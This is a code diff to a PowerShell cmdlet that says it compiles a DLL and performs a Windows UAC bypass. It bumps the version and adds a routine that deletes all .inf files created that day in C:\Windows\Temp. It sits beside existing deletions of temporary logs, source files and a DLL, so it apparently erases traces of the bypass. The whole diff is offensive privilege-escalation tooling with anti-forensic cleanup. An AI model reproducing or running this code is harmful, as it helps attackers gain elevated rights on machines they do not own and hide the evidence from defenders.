@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.3.3
+   PS cmdlet Dev version: v1.3.4
 
 .DESCRIPTION 
    This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
@@ -426,6 +426,16 @@ ShortSvcName=`"`"CorpVPN`"`"
    Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
    Remove-Item -Path "$Env:TMP\$BSDEdit.cs" -EA SilentlyContinue -Force
    Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue -Force  
+
+   $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021
+   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
+   # directory. If the 'CreationTime' of the files Matches todays date!
+   $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" -EA SilentlyContinue | Where-Object { 
+      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
+   }).FullName
+   ForEach($Item in $CleanInf){## Delete ALL .inf files from C:\Windows\Temp
+      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
+   }
 
 }
 
